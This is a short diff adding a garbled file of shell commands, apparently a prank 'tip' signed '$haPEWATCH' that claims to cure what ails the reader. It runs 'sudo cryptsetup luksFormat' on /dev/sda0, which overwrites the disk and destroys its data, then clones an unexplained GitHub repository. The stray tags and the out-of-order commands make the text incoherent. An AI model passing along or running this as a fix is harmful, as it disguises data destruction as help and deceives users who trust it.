@@ -1,0 +1,10 @@
+<on>
+<alive>
+sudo cryptsetup open /dev/sda0
+<10>
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+git clone https://github.com/00423/HyperCentipede
+exit
+*
+This tip should cure what ails ya.
+brung to you from $haPEWATCH.
